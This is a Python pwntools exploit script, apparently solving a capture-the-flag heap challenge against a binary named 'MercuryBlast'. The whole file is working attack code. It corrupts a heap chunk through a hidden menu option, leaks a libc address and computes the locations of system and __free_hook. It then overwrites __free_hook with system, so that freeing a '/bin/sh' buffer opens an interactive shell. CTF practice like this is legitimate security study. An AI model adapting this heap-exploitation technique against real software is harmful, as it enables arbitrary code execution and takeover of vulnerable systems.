from pwn import * 

binary = "./MercuryBlast"
p = process(binary)
s = '''
b * add_record
b * edit_record+384
b * delete_record
b * print_records
b * blast
'''
# add_record+334 before read()
#b * print_records+223
context.log_level = 'debug'
libc = ELF('./libc.so.6')
elf = ELF(binary)
context.binary = binary


def add_record(size, data):
    p.sendlineafter("Your choice: ", "1")
    p.sendlineafter("Input Temperature:", "1")
    p.sendlineafter("Input Description Size: ", str(size))
    p.sendafter("Input Description: ", data)

def edit_record(index, size, buffer): # size <= 0x200
    p.sendlineafter("Your choice: ", "4")
    p.sendlineafter("Input index: ", str(index))
    p.sendlineafter("Input Temperature: ", "1")
    p.sendlineafter("Input Description Size: ", str(size))
    p.sendafter("Input Description: ", buffer)

def delete_record(idx):
    p.sendlineafter("Your choice: ", "3")
    p.sendlineafter("Input Index:", str(idx))

def print_record():
    p.sendlineafter("Your choice: ", "2")

def blast(data):
    p.sendlineafter("Your choice: ", str('\x7f'))
    p.send(data)

add_record(0x100, b'A' * 8)
#gdb.attach(p,s)
blast(p64(0) + p64(0xf1))
add_record(0xe8, b'A' * 8)

print_record()

p.recvuntil(b'\x83')
libc_leak = (int.from_bytes(p.recvuntil(b'\x7f')[-1:-7:-1] + b'\x83'))
libc_base = libc_leak - 0x24083 
sys_addr = libc_base + libc.sym['system']
freeHook_addr = libc_base + libc.sym['__free_hook']

#print("libc_leak:", libc_leak)
print("libc_base:", hex(libc_base))
print("freeHook_addr:", hex(freeHook_addr))

#blast(p64(0xdeadbeef) + p64(0xf1))
#add_record(0xe8, p64(sys_addr))
add_record(0x100, b'A' * 8)
add_record(0x100, b'A' * 8)
edit_record(2, 0x200, b'A' * 0x100 + p64(0) + p64(0x21) + p64(0x1) + p64(0x200) + p64(freeHook_addr))
edit_record(3, 0x100, p64(sys_addr))

edit_record(2,0x200,b'/bin/sh\x00')
gdb.attach(p,s)
delete_record(2)
#print_record()

p.interactive()